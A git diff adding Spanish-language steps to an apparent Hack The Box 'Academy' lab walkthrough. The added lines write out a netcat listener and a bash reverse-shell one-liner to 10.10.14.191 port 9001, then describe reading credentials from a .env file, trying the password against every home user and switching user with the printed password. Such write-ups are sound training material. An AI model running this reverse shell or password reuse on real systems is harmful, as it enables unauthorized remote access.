@@ -55,4 +55,14 @@ Seteo el app_key, que me lo da la web del subdominio en la sección de environme
 
 ![](/assets/images/Academy-Hackthebox/msf.png)
 
+Me pongo a la escucha con rlwrap nc -lvnp 9001 y me lanzo una reverse shell para estar más cómodo
+`bash -c 'bash -i >& /dev/tcp/10.10.14.191/9001 0>&1'`
 
+Voy al directorio academy y con ls -a veo que hay un fichero .env que puedo leer y que contiene unas credenciales.
+
+![](/assets/images/Academy-Hackthebox/creds.png)
+
+En el directorio home hay varios usuarios, pruebo la contraseña con todos y hay uno que funciona.
+
+`su cry0l1t3
+Password: mySup3rP4s5w0rd!!`
